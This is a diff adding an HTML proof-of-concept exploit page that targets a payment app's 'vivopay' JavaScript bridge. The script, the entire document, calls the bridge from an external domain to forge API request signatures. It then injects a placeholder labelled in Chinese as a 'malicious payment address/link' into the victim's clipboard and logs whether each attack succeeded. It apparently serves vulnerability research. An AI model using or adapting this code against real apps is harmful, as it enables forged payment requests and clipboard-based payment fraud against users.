@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body>
+<pre id="s">Exploiting...</pre>
+<script>
+var log = '';
+function l(m) { log += m + '\n'; document.getElementById('s').textContent = log; }
+
+l('Domain: ' + document.domain);
+
+// API签名伪造
+try {
+    var sig = window.vivopay.signKey(['param1=value1', 'param2=value2', 'timestamp=12345']);
+    l('signKey result: ' + sig);
+    l('SUCCESS: Can forge API signatures from external domain!');
+} catch(e) {
+    l('signKey error: ' + e.message);
+}
+
+//  剪贴板注入
+try {
+    window.vivopay.clipboard('恶意收款地址/链接');
+    l('clipboard injection: SUCCESS');
+} catch(e) {
+    l('clipboard error: ' + e.message);
+}
+</script>
+</body>
+</html>
